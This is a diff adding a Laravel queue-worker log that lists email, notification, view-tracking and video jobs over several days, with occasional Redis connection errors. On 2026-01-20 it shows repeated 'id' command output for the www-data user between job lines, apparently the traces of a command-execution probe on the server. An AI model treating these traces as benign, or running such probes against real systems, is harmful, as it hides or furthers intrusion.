@@ -1,0 +1,1670 @@
+  2026-01-17 18:33:05 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 18:33:06 App\Mail\User\Auth\ResetPasswordMail ..... 706.74ms DONE
+  2026-01-17 18:39:42 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 18:39:42 App\Jobs\User\Views\RegisterResourceViews . 33.34ms DONE
+  2026-01-17 18:45:48 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 18:45:48 App\Jobs\User\Views\RegisterResourceViews . 14.99ms DONE
+  2026-01-17 18:46:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 18:46:03 App\Jobs\User\Views\RegisterResourceViews . 32.17ms DONE
+  2026-01-17 18:49:48 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 18:49:49 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 18:49:49 App\Mail\User\Auth\VerifyEmailMail ....... 646.89ms DONE
+  2026-01-17 18:49:49 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-17 18:54:59 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 18:54:59 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 18:54:59 App\Mail\User\Auth\VerifyEmailMail ....... 664.57ms DONE
+  2026-01-17 18:54:59 App\Mail\User\Auth\VerifyEmailMail ....... 755.11ms DONE
+  2026-01-17 19:00:45 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 19:00:45 App\Mail\User\Auth\VerifyEmailMail ....... 145.61ms DONE
+  2026-01-17 19:01:12 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 19:01:12 App\Mail\User\Auth\VerifyEmailMail ........ 89.18ms DONE
+  2026-01-17 19:05:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 19:05:06 App\Jobs\User\Views\RegisterResourceViews . 33.20ms DONE
+  2026-01-17 19:07:12 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 19:07:12 App\Mail\User\Auth\VerifyEmailMail ....... 129.08ms DONE
+  2026-01-17 19:08:45 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 19:08:45 App\Mail\User\Auth\ResetPasswordMail ..... 111.42ms DONE
+  2026-01-17 19:08:54 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 19:08:54 App\Mail\User\Auth\ResetPasswordMail ...... 60.56ms DONE
+  2026-01-17 19:09:30 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 19:09:30 App\Mail\User\Auth\ResetPasswordMail ...... 22.04ms DONE
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  22.59ms DONE
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  17.21ms DONE
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:12 App\Notifications\User\Important\AccountLinkedNotification  6.67ms DONE
+  2026-01-17 19:10:12 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-17 19:10:13 Illuminate\Notifications\Events\BroadcastNotificationCreated  68.22ms DONE
+  2026-01-17 19:10:27 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:27 App\Notifications\User\Important\AccountLinkedNotification  27.31ms DONE
+  2026-01-17 19:10:27 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:28 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 19:10:28 App\Notifications\User\Important\AccountLinkedNotification  4.12ms DONE
+  2026-01-17 19:10:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-17 19:10:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  5.56ms DONE
+  2026-01-17 19:10:33 App\Notifications\User\Important\AccountLinkedNotification  5s DONE
+  2026-01-17 19:19:00 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 19:19:01 App\Mail\User\Auth\ResetPasswordMail ..... 736.35ms DONE
+  2026-01-17 19:33:28 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 19:33:29 App\Mail\User\Auth\VerifyEmailMail ....... 705.24ms DONE
+  2026-01-17 19:40:32 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 19:40:32 App\Jobs\User\Views\RegisterResourceViews . 11.56ms DONE
+  2026-01-17 19:48:47 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 19:48:47 App\Jobs\User\Views\RegisterResourceViews . 10.77ms DONE
+
+In PhpRedisConnector.php line 175:
+                      
+  Connection refused  
+                      
+
+  2026-01-17 19:59:20 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 19:59:21 App\Mail\User\Auth\ResetPasswordMail ..... 704.47ms DONE
+  2026-01-17 20:05:41 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 20:05:42 App\Mail\User\Auth\VerifyEmailMail ....... 682.61ms DONE
+  2026-01-17 20:09:33 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 20:09:34 App\Mail\User\Auth\ResetPasswordMail ..... 683.56ms DONE
+  2026-01-17 20:10:13 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 20:10:13 App\Jobs\User\Views\RegisterResourceViews . 26.58ms DONE
+  2026-01-17 20:11:42 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 20:11:43 App\Mail\User\Auth\VerifyEmailMail ....... 683.88ms DONE
+  2026-01-17 20:29:53 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 20:29:54 App\Mail\User\Auth\VerifyEmailMail ....... 705.99ms DONE
+  2026-01-17 20:42:33 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 20:42:34 App\Mail\User\Auth\ResetPasswordMail ..... 648.45ms DONE
+  2026-01-17 20:57:03 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 20:57:04 App\Mail\User\Auth\VerifyEmailMail ....... 723.62ms DONE
+  2026-01-17 20:58:13 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 20:58:14 App\Mail\User\Auth\VerifyEmailMail ....... 602.09ms DONE
+  2026-01-17 21:01:59 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 21:01:59 App\Jobs\User\Views\RegisterResourceViews . 14.94ms DONE
+  2026-01-17 21:13:23 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 21:13:24 App\Mail\User\Auth\VerifyEmailMail ....... 652.68ms DONE
+  2026-01-17 21:20:45 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 21:20:46 App\Mail\User\Auth\VerifyEmailMail ....... 643.02ms DONE
+  2026-01-17 21:57:25 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-17 21:57:26 App\Mail\User\Auth\VerifyEmailMail ....... 745.66ms DONE
+  2026-01-17 22:04:35 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 22:04:36 App\Mail\User\Auth\ResetPasswordMail ..... 698.90ms DONE
+  2026-01-17 22:05:51 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-17 22:05:51 App\Mail\User\Auth\ResetPasswordMail ..... 652.53ms DONE
+  2026-01-17 22:48:50 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 22:48:50 App\Jobs\User\Views\RegisterResourceViews . 10.42ms DONE
+  2026-01-17 22:49:08 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 22:49:08 App\Jobs\User\Views\RegisterResourceViews . 28.38ms DONE
+  2026-01-17 22:52:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 22:52:26 App\Jobs\User\Views\RegisterResourceViews .. 9.97ms DONE
+  2026-01-17 22:56:35 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 22:56:35 App\Notifications\User\Important\AccountLinkedNotification  28.59ms DONE
+  2026-01-17 22:56:35 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 22:56:35 App\Notifications\User\Important\AccountLinkedNotification  RUNNING
+  2026-01-17 22:56:35 App\Notifications\User\Important\AccountLinkedNotification  22.59ms DONE
+  2026-01-17 22:56:35 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-17 22:56:36 Illuminate\Notifications\Events\BroadcastNotificationCreated  61.94ms DONE
+  2026-01-17 22:56:36 App\Notifications\User\Important\AccountLinkedNotification  764.82ms DONE
+  2026-01-17 23:17:25 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 23:17:25 App\Jobs\User\Views\RegisterResourceViews .. 9.79ms DONE
+  2026-01-17 23:39:52 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-17 23:39:52 App\Notifications\User\Post\PostReactedNotification  22.59ms DONE
+  2026-01-17 23:39:52 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-17 23:39:53 App\Notifications\User\Post\PostReactedNotification  15.78ms DONE
+  2026-01-17 23:39:53 App\Notifications\User\Post\PostReactedNotification  RUNNING
+  2026-01-17 23:39:54 App\Notifications\User\Post\PostReactedNotification  1s DONE
+  2026-01-17 23:39:58 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-17 23:39:58 App\Notifications\User\Follows\NewFollowerNotification  7.05ms DONE
+  2026-01-17 23:39:58 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-17 23:39:58 App\Notifications\User\Follows\NewFollowerNotification  13.12ms DONE
+  2026-01-17 23:39:58 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-17 23:39:59 App\Notifications\User\Follows\NewFollowerNotification  670.83ms DONE
+  2026-01-17 23:39:59 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-17 23:39:59 Illuminate\Notifications\Events\BroadcastNotificationCreated  49.21ms DONE
+  2026-01-17 23:43:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 23:43:03 App\Jobs\User\Views\RegisterResourceViews . 12.97ms DONE
+  2026-01-17 23:46:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-17 23:46:26 App\Jobs\User\Views\RegisterResourceViews .. 9.24ms DONE
+  2026-01-18 00:51:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 00:51:57 App\Jobs\User\Views\RegisterResourceViews . 13.56ms DONE
+  2026-01-18 00:52:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 00:52:30 App\Jobs\User\Views\RegisterResourceViews . 12.40ms DONE
+  2026-01-18 01:20:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 01:20:45 App\Jobs\User\Views\RegisterResourceViews . 28.80ms DONE
+  2026-01-18 01:55:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 01:55:55 App\Jobs\User\Views\RegisterResourceViews . 11.82ms DONE
+  2026-01-18 01:56:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 01:56:28 App\Jobs\User\Views\RegisterResourceViews . 14.37ms DONE
+  2026-01-18 02:08:41 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 02:08:41 App\Jobs\User\Views\RegisterResourceViews . 17.53ms DONE
+  2026-01-18 09:22:42 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 09:22:42 App\Jobs\User\Views\RegisterResourceViews . 14.55ms DONE
+  2026-01-18 13:45:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 13:45:57 App\Jobs\User\Views\RegisterResourceViews . 25.01ms DONE
+  2026-01-18 13:47:30 App\Notifications\System\Deposit\DepositSuccessNotification  RUNNING
+  2026-01-18 13:47:30 App\Notifications\System\Deposit\DepositSuccessNotification  21.27ms DONE
+  2026-01-18 13:47:30 App\Notifications\System\Deposit\DepositSuccessNotification  RUNNING
+  2026-01-18 13:47:31 App\Notifications\System\Deposit\DepositSuccessNotification  659.03ms DONE
+  2026-01-18 15:57:47 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 15:57:47 App\Jobs\User\Views\RegisterResourceViews . 14.73ms DONE
+  2026-01-18 16:00:58 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 16:00:58 App\Jobs\User\Views\RegisterResourceViews . 23.67ms DONE
+  2026-01-18 16:01:44 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  RUNNING
+  2026-01-18 16:02:20 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  36s DONE
+  2026-01-18 16:59:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 16:59:17 App\Jobs\User\Views\RegisterResourceViews . 13.99ms DONE
+
+In PhpRedisConnector.php line 175:
+                      
+  Connection refused  
+                      
+
+
+In PhpRedisConnector.php line 175:
+                      
+  Connection refused  
+                      
+
+  2026-01-18 17:29:50 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 17:29:50 App\Jobs\User\Views\RegisterResourceViews . 26.30ms DONE
+  2026-01-18 17:29:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 17:29:56 App\Jobs\User\Views\RegisterResourceViews . 37.26ms DONE
+  2026-01-18 17:36:38 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 17:36:38 App\Jobs\User\Views\RegisterResourceViews . 10.54ms DONE
+  2026-01-18 17:44:09 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 17:44:09 App\Jobs\User\Views\RegisterResourceViews . 15.34ms DONE
+  2026-01-18 19:01:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 19:01:45 App\Jobs\User\Views\RegisterResourceViews . 18.87ms DONE
+  2026-01-18 19:02:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 19:02:45 App\Jobs\User\Views\RegisterResourceViews . 10.31ms DONE
+  2026-01-18 19:06:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 19:06:34 App\Jobs\User\Views\RegisterResourceViews . 15.95ms DONE
+  2026-01-18 19:10:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 19:10:28 App\Jobs\User\Views\RegisterResourceViews . 11.89ms DONE
+  2026-01-18 19:11:58 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 19:11:58 App\Jobs\User\Views\RegisterResourceViews . 12.10ms DONE
+  2026-01-18 19:34:11 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-18 19:34:11 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-18 19:34:11 App\Notifications\User\Follows\NewFollowerNotification  29.73ms DONE
+  2026-01-18 19:34:11 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-18 19:34:11 App\Notifications\User\Follows\NewFollowerNotification  35.25ms DONE
+  2026-01-18 19:34:11 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-18 19:34:11 Illuminate\Notifications\Events\BroadcastNotificationCreated  74.57ms DONE
+  2026-01-18 19:34:12 App\Notifications\User\Follows\NewFollowerNotification  720.17ms DONE
+  2026-01-18 21:53:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 21:53:57 App\Jobs\User\Views\RegisterResourceViews . 14.78ms DONE
+  2026-01-18 22:03:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 22:03:57 App\Jobs\User\Views\RegisterResourceViews . 32.26ms DONE
+  2026-01-18 22:06:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 22:06:54 App\Jobs\User\Views\RegisterResourceViews . 12.30ms DONE
+  2026-01-18 22:51:14 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 22:51:14 App\Jobs\User\Views\RegisterResourceViews . 16.94ms DONE
+  2026-01-18 22:51:47 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-18 22:51:47 App\Jobs\User\Views\RegisterResourceViews . 11.64ms DONE
+  2026-01-19 01:36:00 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 01:36:00 App\Notifications\User\Follows\NewFollowerNotification  11.37ms DONE
+  2026-01-19 01:36:00 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 01:36:00 App\Notifications\User\Follows\NewFollowerNotification  9.40ms DONE
+  2026-01-19 01:36:00 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 01:36:01 App\Notifications\User\Follows\NewFollowerNotification  789.72ms DONE
+  2026-01-19 01:39:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-19 01:39:28 Illuminate\Notifications\Events\BroadcastNotificationCreated  61.34ms DONE
+  2026-01-19 14:22:00 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 14:22:01 App\Mail\User\Auth\VerifyEmailMail ............. 1s DONE
+  2026-01-19 14:23:50 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:23:50 App\Jobs\User\Views\RegisterResourceViews . 28.73ms DONE
+  2026-01-19 14:25:30 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 14:25:31 App\Mail\User\Auth\VerifyEmailMail ....... 757.53ms DONE
+  2026-01-19 14:35:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:35:34 App\Jobs\User\Views\RegisterResourceViews . 36.24ms DONE
+  2026-01-19 14:36:44 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:36:44 App\Jobs\User\Views\RegisterResourceViews . 15.38ms DONE
+  2026-01-19 14:36:46 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:36:46 App\Jobs\User\Views\RegisterResourceViews . 16.89ms DONE
+  2026-01-19 14:45:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:45:24 App\Jobs\User\Views\RegisterResourceViews . 11.45ms DONE
+  2026-01-19 14:53:41 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  RUNNING
+  2026-01-19 14:54:20 App\Jobs\User\Timeline\ConvertAndCompressPostVideo  38s DONE
+  2026-01-19 14:54:29 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 14:54:29 App\Jobs\User\Views\RegisterResourceViews . 13.84ms DONE
+  2026-01-19 15:16:57 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 15:16:57 App\Jobs\User\Views\RegisterResourceViews . 21.57ms DONE
+  2026-01-19 15:17:11 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 15:17:11 App\Jobs\User\Views\RegisterResourceViews . 11.76ms DONE
+  2026-01-19 15:17:39 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 15:17:39 App\Jobs\User\Views\RegisterResourceViews . 11.02ms DONE
+  2026-01-19 15:17:56 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-19 15:17:56 App\Notifications\User\Chat\MessageReceivedNotification  50.15ms DONE
+  2026-01-19 15:17:56 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-19 15:17:56 Illuminate\Notifications\Events\BroadcastNotificationCreated  294.66ms DONE
+  2026-01-19 15:45:15 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 15:45:16 App\Mail\User\Auth\VerifyEmailMail ....... 839.31ms DONE
+  2026-01-19 15:47:58 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 15:47:59 App\Mail\User\Auth\VerifyEmailMail ....... 669.34ms DONE
+  2026-01-19 15:48:02 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 15:48:02 App\Mail\User\Auth\VerifyEmailMail ....... 733.93ms DONE
+  2026-01-19 16:51:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 16:51:02 App\Jobs\User\Views\RegisterResourceViews . 16.36ms DONE
+  2026-01-19 16:51:20 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 16:51:20 App\Jobs\User\Views\RegisterResourceViews . 15.16ms DONE
+  2026-01-19 17:21:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 17:21:49 App\Jobs\User\Views\RegisterResourceViews . 21.86ms DONE
+  2026-01-19 17:34:41 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 17:34:41 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 17:34:42 App\Mail\User\Auth\VerifyEmailMail ....... 756.28ms DONE
+  2026-01-19 17:34:44 App\Mail\User\Auth\VerifyEmailMail ............. 3s DONE
+  2026-01-19 17:40:33 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 17:40:33 App\Jobs\User\Views\RegisterResourceViews . 22.12ms DONE
+  2026-01-19 17:43:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 17:43:54 App\Jobs\User\Views\RegisterResourceViews . 13.37ms DONE
+  2026-01-19 19:13:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 19:13:05 App\Jobs\User\Views\RegisterResourceViews . 18.44ms DONE
+  2026-01-19 19:13:41 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 19:13:41 App\Jobs\User\Views\RegisterResourceViews . 13.87ms DONE
+  2026-01-19 19:50:43 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 19:50:44 App\Mail\User\Auth\VerifyEmailMail ....... 805.68ms DONE
+  2026-01-19 20:20:37 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 20:20:40 App\Mail\User\Auth\VerifyEmailMail ............. 3s DONE
+  2026-01-19 20:23:13 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 20:23:13 App\Notifications\User\Follows\NewFollowerNotification  32.02ms DONE
+  2026-01-19 20:23:13 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 20:23:13 App\Notifications\User\Follows\NewFollowerNotification  27.91ms DONE
+  2026-01-19 20:23:13 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-19 20:23:15 App\Notifications\User\Follows\NewFollowerNotification  1s DONE
+  2026-01-19 20:24:30 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 20:24:30 App\Jobs\User\Views\RegisterResourceViews . 10.05ms DONE
+  2026-01-19 20:24:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 20:24:36 App\Jobs\User\Views\RegisterResourceViews . 14.59ms DONE
+  2026-01-19 21:06:38 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 21:06:38 App\Mail\User\Auth\VerifyEmailMail ....... 849.31ms DONE
+  2026-01-19 22:19:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 22:19:02 App\Jobs\User\Views\RegisterResourceViews . 17.65ms DONE
+  2026-01-19 22:19:08 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 22:19:08 App\Jobs\User\Views\RegisterResourceViews . 12.48ms DONE
+  2026-01-19 22:19:56 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-19 22:19:57 App\Mail\User\Auth\VerifyEmailMail ....... 734.66ms DONE
+  2026-01-19 22:32:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 22:32:36 App\Jobs\User\Views\RegisterResourceViews . 18.01ms DONE
+  2026-01-19 22:43:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-19 22:43:31 App\Jobs\User\Views\RegisterResourceViews . 16.13ms DONE
+  2026-01-20 10:37:08 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 10:37:09 App\Mail\User\Auth\VerifyEmailMail ....... 744.23ms DONE
+  2026-01-20 10:45:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 10:45:03 App\Jobs\User\Views\RegisterResourceViews . 32.98ms DONE
+  2026-01-20 10:50:48 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-20 10:50:48 App\Notifications\User\Chat\MessageReceivedNotification  25.74ms DONE
+  2026-01-20 10:50:48 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-20 10:50:49 Illuminate\Notifications\Events\BroadcastNotificationCreated  296.39ms DONE
+  2026-01-20 16:04:59 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-20 16:04:59 Illuminate\Notifications\Notification ...... 8.70ms DONE
+  2026-01-20 16:17:01 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 16:17:01 App\Jobs\User\Views\RegisterResourceViews . 37.96ms DONE
+  2026-01-20 16:17:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 16:17:04 App\Jobs\User\Views\RegisterResourceViews . 11.04ms DONE
+  2026-01-20 16:17:34 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 16:17:35 App\Mail\User\Auth\VerifyEmailMail ....... 766.30ms DONE
+  2026-01-20 16:31:38 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+  2026-01-20 16:31:39 App\Mail\User\Auth\ResetPasswordMail ..... 671.16ms DONE
+  2026-01-20 16:34:12 App\Mail\User\Auth\ResetPasswordMail ........... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 16:34:13 App\Mail\User\Auth\ResetPasswordMail ..... 695.55ms DONE
+  2026-01-20 18:35:06 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-20 18:35:06 Illuminate\Notifications\Notification ...... 8.36ms DONE
+  2026-01-20 20:51:03 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 20:51:03 App\Jobs\User\Views\RegisterResourceViews . 12.48ms DONE
+  2026-01-20 20:51:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-20 20:51:45 App\Jobs\User\Views\RegisterResourceViews . 10.79ms DONE
+  2026-01-20 21:05:40 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:05:41 App\Mail\User\Auth\VerifyEmailMail ....... 825.80ms DONE
+  2026-01-20 21:05:52 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:05:52 App\Mail\User\Auth\VerifyEmailMail ....... 714.55ms DONE
+  2026-01-20 21:05:59 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:06:00 App\Mail\User\Auth\VerifyEmailMail ....... 639.52ms DONE
+  2026-01-20 21:06:21 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:06:21 App\Mail\User\Auth\VerifyEmailMail ....... 670.72ms DONE
+  2026-01-20 21:06:24 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:06:25 App\Mail\User\Auth\VerifyEmailMail ....... 646.66ms DONE
+  2026-01-20 21:06:34 App\Mail\User\Auth\VerifyEmailMail ............. RUNNING
+  2026-01-20 21:06:35 App\Mail\User\Auth\VerifyEmailMail ....... 664.22ms DONE
+  2026-01-20 21:16:44 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-20 21:16:44 Illuminate\Notifications\Notification ...... 2.45ms DONE
+  2026-01-20 21:17:04 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-20 21:17:04 Illuminate\Notifications\Notification ...... 2.68ms DONE
+  2026-01-20 21:17:43 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:17:43 Illuminate\Notifications\Notification ...... 3.85ms DONE
+  2026-01-20 21:18:13 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:18:13 Illuminate\Notifications\Notification ...... 3.73ms DONE
+  2026-01-20 21:20:44 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:20:44 Illuminate\Notifications\Notification ...... 5.82ms DONE
+  2026-01-20 21:24:35 Illuminate\Notifications\Notification .......... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-20 21:24:35 Illuminate\Notifications\Notification ...... 5.97ms DONE
